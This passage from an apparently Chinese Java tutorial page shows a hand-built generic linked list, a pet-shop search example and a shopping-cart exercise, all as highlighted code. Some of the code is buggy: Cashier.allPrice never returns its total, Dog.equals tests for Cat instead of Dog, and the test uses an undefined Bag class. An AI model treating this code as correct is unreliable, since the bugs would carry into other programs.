class="built_in">this</span>.next.toArrayNode();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> E <span class="title function_">getNode</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (LinkImpl1.<span class="built_in">this</span>.foot++ == index) &#123;</span><br><span class="line">                <span class="comment">//索引相同</span></span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">this</span>.data;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">this</span>.next.getNode(index);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setNode</span><span class="params">(<span class="type">int</span> index, E data)</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (LinkImpl1.<span class="built_in">this</span>.foot++ == index) &#123;</span><br><span class="line">                <span class="comment">//索引相同</span></span><br><span class="line">                <span class="built_in">this</span>.data = data;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">this</span>.next.setNode(index, data);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">containsNode</span><span class="params">(E data)</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.data.equals(data)) &#123;<span class="comment">//对象比较</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>.next == <span class="literal">null</span>) &#123;<span class="comment">//无后续节点</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="built_in">this</span>.next.containsNode(data);<span class="comment">//向后继续判断</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">removeNode</span><span class="params">(Node previous, E data)</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.data.equals(data)) &#123;</span><br><span class="line">                previous.next = <span class="built_in">this</span>.next;<span class="comment">//空出当前节点</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>.next != <span class="literal">null</span>) &#123; <span class="comment">//有后续节点</span></span><br><span class="line">                    <span class="built_in">this</span>.next.removeNode(<span class="built_in">this</span>, data); <span class="comment">//向后继续删除</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// -----------以下为Link类中定义的成员----------</span></span><br><span class="line">    <span class="keyword">private</span> Node root; <span class="comment">//保存根元素</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> count;<span class="comment">//保存数据个数</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> foot;<span class="comment">//描述的是操作数组的脚标</span></span><br><span class="line">    <span class="keyword">private</span> Object[] returnData;<span class="comment">//返回的数据保存</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// -----------以下为Link类中定义的方法----------</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add1</span><span class="params">(E e)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (e == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//数据本身是不具有关联性的,只有Node类有，那么想要实现关联处理就必须将数据包装在Node类之中</span></span><br><span class="line">        <span class="type">Node</span> <span class="variable">newNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Node</span>(e);<span class="comment">//创建一个新节点</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.root == <span class="literal">null</span>) &#123; <span class="comment">//现在没有根节点</span></span><br><span class="line">            <span class="built_in">this</span>.root = newNode; <span class="comment">//现在第一个节点作为根节点</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.root.addNode(newNode);<span class="comment">//将新节点保存在合适的位置</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.count++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">size1</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.count;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isEmpty</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//return this.root == null;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.count == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object[] toArray() &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;<span class="comment">//无数据</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.foot = <span class="number">0</span>;<span class="comment">//脚标清0</span></span><br><span class="line">        <span class="built_in">this</span>.returnData = <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="built_in">this</span>.count];<span class="comment">//根据已有的长度开辟数组</span></span><br><span class="line">        <span class="built_in">this</span>.root.toArrayNode();<span class="comment">//利用Node类进行递归数据获取</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.returnData;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> E <span class="title function_">get</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (index &gt;= <span class="built_in">this</span>.count) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//索引数据的获取应该由Node类完成</span></span><br><span class="line">        <span class="built_in">this</span>.foot = <span class="number">0</span>;<span class="comment">//重置索引的下标</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.root.getNode(index);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">set</span><span class="params">(<span class="type">int</span> index, E data)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (index &gt;= <span class="built_in">this</span>.count) &#123;</span><br><span class="line">            <span class="keyword">return</span>;<span class="comment">//方法结束</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//索引数据的获取应该由Node类完成</span></span><br><span class="line">        <span class="built_in">this</span>.foot = <span class="number">0</span>;<span class="comment">//重置索引的下标</span></span><br><span class="line">        <span class="built_in">this</span>.root.setNode(index, data);<span class="comment">//修改数据</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">contains</span><span class="params">(E data)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (data == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.root.containsNode(data);<span class="comment">//交给Node类判断</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">remove</span><span class="params">(E data)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.contains(data)) &#123; <span class="comment">//判断数据是否存在</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.root.data.equals(data)) &#123; <span class="comment">//根节点为要删除节点</span></span><br><span class="line">                <span class="built_in">this</span>.root = <span class="built_in">this</span>.root.next; <span class="comment">//根的下一个节点</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123; <span class="comment">//交由Node类负责删除</span></span><br><span class="line">                <span class="built_in">this</span>.root.next.removeNode(<span class="built_in">this</span>.root, data);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">this</span>.count--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">clean</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.root = <span class="literal">null</span>; <span class="comment">//后续所有的都没了</span></span><br><span class="line">        <span class="built_in">this</span>.count = <span class="number">0</span>; <span class="comment">//个数清零</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Pet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName1</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getColor1</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PetShop</span> &#123; <span class="comment">//宠物商店</span></span><br><span class="line">    <span class="keyword">private</span> ILink1&lt;Pet&gt; allPets = <span class="keyword">new</span> <span class="title class_">LinkImpl1</span>&lt;&gt;(); <span class="comment">//保存多个宠物信息</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add1</span><span class="params">(Pet pet)</span> &#123; <span class="comment">//追加宠物，商品上架</span></span><br><span class="line">        <span class="built_in">this</span>.allPets.add1(pet); <span class="comment">//集合中保存对象</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">delete1</span><span class="params">(Pet pet)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.allPets.remove(pet);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> ILink1&lt;Pet&gt; <span class="title function_">search</span><span class="params">(String keyword)</span> &#123;</span><br><span class="line">        ILink1&lt;Pet&gt; searchResult = <span class="keyword">new</span> <span class="title class_">LinkImpl1</span>&lt;&gt;();<span class="comment">//保存查询结果</span></span><br><span class="line">        Object result[] = <span class="built_in">this</span>.allPets.toArray(); <span class="comment">//获取全部数据</span></span><br><span class="line">        <span class="keyword">if</span> (result != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (Object obj : result) &#123;</span><br><span class="line">                <span class="type">Pet</span> <span class="variable">pet</span> <span class="operator">=</span> (Pet) obj;</span><br><span class="line">                <span class="keyword">if</span> (pet.getName1().contains(keyword) || pet.getColor1().contains(keyword)) &#123;</span><br><span class="line">                    searchResult.add1(pet);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> searchResult;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Cat</span> <span class="keyword">implements</span> <span class="title class_">Pet</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String color;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Cat</span><span class="params">(String name, String color)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.color = color;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName1</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getColor1</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.color;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object obj)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (obj == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!(obj <span class="keyword">instanceof</span> Cat)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span> == obj) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Cat</span> <span class="variable">cat</span> <span class="operator">=</span> (Cat) obj;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name.equals(cat.name) &amp;&amp; <span class="built_in">this</span>.color.equals(cat.color);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;【宠物猫】名字&quot;</span> + <span class="built_in">this</span>.name + <span class="string">&quot;、颜色：&quot;</span> + <span class="built_in">this</span>.color;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span> <span class="keyword">implements</span> <span class="title class_">Pet</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String color;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Dog</span><span class="params">(String name, String color)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.color = color;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName1</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getColor1</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.color;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object obj)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (obj == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!(obj <span class="keyword">instanceof</span> Cat)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span> == obj) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Dog</span> <span class="variable">dog</span> <span class="operator">=</span> (Dog) obj;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name.equals(dog.name) &amp;&amp; <span class="built_in">this</span>.color.equals(dog.color);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;【宠物狗】名字&quot;</span> + <span class="built_in">this</span>.name + <span class="string">&quot;、颜色：&quot;</span> + <span class="built_in">this</span>.color;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test65</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">PetShop</span> <span class="variable">shop</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PetShop</span>();</span><br><span class="line">        shop.add1(<span class="keyword">new</span> <span class="title class_">Dog</span>(<span class="string">&quot;黄斑狗&quot;</span>, <span class="string">&quot;绿色&quot;</span>));</span><br><span class="line">        shop.add1(<span class="keyword">new</span> <span class="title class_">Cat</span>(<span class="string">&quot;小强猫&quot;</span>, <span class="string">&quot;深绿色&quot;</span>));</span><br><span class="line">        shop.add1(<span class="keyword">new</span> <span class="title class_">Dog</span>(<span class="string">&quot;黄狗&quot;</span>, <span class="string">&quot;黄色&quot;</span>));</span><br><span class="line">        shop.add1(<span class="keyword">new</span> <span class="title class_">Dog</span>(<span class="string">&quot;斑点狗&quot;</span>, <span class="string">&quot;灰色&quot;</span>));</span><br><span class="line">        Object result[] = shop.search(<span class="string">&quot;黄&quot;</span>).toArray();</span><br><span class="line">        <span class="keyword">for</span> (Object obj : result) &#123;</span><br><span class="line">            System.out.println(obj);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    所有的程序开发都是以接口为标准进行的，这样后期处理的时候可以非常的灵活，只要符合标准的对象都可以保存。</p><h5 id="链表综合实战：超市购物车"><a href="#链表综合实战：超市购物车" class="headerlink" title="链表综合实战：超市购物车"></a>链表综合实战：超市购物车</h5><p>​    使用面向对象的概念表示出下面的生活场景：小明去超市买东西，所有买到的东西都放在了购物车之中，最后到收银台一起结账。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-73721.jpg"                      alt="image-20220804141427594"                ></p><p>​    1、定义出一个商品的标准</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">IGoods</span> &#123; <span class="comment">//定义商品标准</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName1</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">getPrice1</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    2、定义购物车处理标准</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">IShopCar</span> &#123; <span class="comment">//定义购物车标准</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add1</span><span class="params">(IGoods goods)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">delete1</span><span class="params">(IGoods goods)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object[] getAll1();<span class="comment">//获得购物车全部标准信息</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    3、定义购物车的实现类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ShopCarImpl</span> <span class="keyword">implements</span> <span class="title class_">IShopCar</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> ILink2&lt;IGoods&gt; allGoodses = <span class="keyword">new</span> <span class="title class_">LinkImpl2</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add1</span><span class="params">(IGoods goods)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.allGoodses.add1(goods);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">delete1</span><span class="params">(IGoods goods)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.allGoodses.remove(goods);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object[] getAll1() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.allGoodses.toArray();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    4、定义收银台</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Cashier</span>&#123; <span class="comment">//收银台</span></span><br><span class="line">    <span class="keyword">private</span> IShopCar shopCar;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Cashier</span><span class="params">(IShopCar shopCar)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.shopCar = shopCar;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">allPrice</span><span class="params">()</span>&#123; <span class="comment">//计算总价</span></span><br><span class="line">        <span class="type">double</span> <span class="variable">all</span> <span class="operator">=</span> <span class="number">0.0</span>;</span><br><span class="line">        Object result[] = <span class="built_in">this</span>.shopCar.getAll1();</span><br><span class="line">        <span class="keyword">for</span> (Object obj : result)&#123;</span><br><span class="line">            <span class="type">IGoods</span> <span class="variable">goods</span> <span class="operator">=</span> (IGoods) obj;</span><br><span class="line">            all += goods.getPrice1();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">allCount</span><span class="params">()</span>&#123; <span class="comment">//商品数量</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.shopCar.getAll1().length;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    5、定义商品信息</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Book</span> <span class="keyword">implements</span> <span class="title class_">IGoods</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> price;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Book</span><span class="params">(String name, <span class="type">double</span> price)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.price = price;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName1</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">getPrice1</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.price;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object obj)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (obj == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span> == obj) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!(obj <span class="keyword">instanceof</span> Book)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Book</span> <span class="variable">book</span> <span class="operator">=</span> (Book) obj;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name.equals(book.name) &amp;&amp; <span class="built_in">this</span>.price == book.price;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;【图书信息】名称：&quot;</span> + <span class="built_in">this</span>.name + <span class="string">&quot;【图书价格】价格：&quot;</span> + <span class="built_in">this</span>.price;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    6、进行代码测试的编写</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">IShopCar</span> <span class="variable">car</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ShopCarImpl</span>();</span><br><span class="line">    car.add1(<span class="keyword">new</span> <span class="title class_">Book</span>(<span class="string">&quot;java开发&quot;</span>, <span class="number">79.8</span>));</span><br><span class="line">    car.add1(<span class="keyword">new</span> <span class="title class_">Book</span>(<span class="string">&quot;Oracle&quot;</span>, <span class="number">89.8</span>));</span><br><span class="line">    car.add1(<span class="keyword">new</span> <span class="title class_">Bag</span>(<span class="string">&quot;小强背包&quot;</span>, <span class="number">898.1</span>));</span><br><span class="line">    <span class="type">Cashier</span> <span class="variable">cas</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cashier</span>(car);</span><br><span class="line">    System.out.println(<span class="string">&quot;总价格：&quot;</span> + cas.allPrice() + <span class="string">&quot;、购买数量：&quot;</span> + cas.allCount());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>范例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span 